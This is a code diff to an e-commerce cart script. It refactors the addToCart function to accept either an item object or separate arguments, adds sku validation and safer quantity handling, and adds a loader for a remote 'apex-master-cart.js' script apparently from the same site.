@@ -114,10 +114,32 @@ function removeSingleCartItem(idx) {
   updateCartCount();
   if (typeof window.renderCart === "function") window.renderCart();
 }
-function addToCart(item) {
+function addToCart(nameOrItem, sku, price, preorder) {
+  var item;
+  if (nameOrItem && typeof nameOrItem === "object") {
+    item = {
+      name: nameOrItem.name || nameOrItem.sku || "Item",
+      sku: nameOrItem.sku || "",
+      price: Number(nameOrItem.price) || 0,
+      quantity: Number(nameOrItem.quantity) || 1,
+      preorder: !!nameOrItem.preorder
+    };
+  } else {
+    item = {
+      name: nameOrItem || sku || "Item",
+      sku: sku || "",
+      price: Number(price) || 0,
+      quantity: 1,
+      preorder: !!preorder
+    };
+  }
+  if (!item.sku) {
+    console.error("addToCart: missing sku", nameOrItem, sku);
+    return;
+  }
   var cart = JSON.parse(localStorage.getItem("jdw_cart") || "[]") || [];
-  var found = cart.find(function (c) { return c.sku === item.sku; });
-  if (found) found.quantity = (found.quantity || 1) + (item.quantity || 1);
+  var found = cart.find(function (c) { return c && c.sku === item.sku; });
+  if (found) found.quantity = (Number(found.quantity) || 1) + (Number(item.quantity) || 1);
   else cart.push(item);
   localStorage.setItem("jdw_cart", JSON.stringify(cart));
   updateCartCount();
@@ -161,4 +183,12 @@ window.updateCartCount = updateCartCount;
   }
   if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", run);
   else run();
+})();
+
+(function loadMasterCart() {
+  if (document.querySelector('script[src*="apex-master-cart.js"]')) return;
+  var s = document.createElement("script");
+  s.src = "https://jdwapexherp.com/apex-master-cart.js?v=master2";
+  s.async = true;
+  document.head.appendChild(s);
 })();
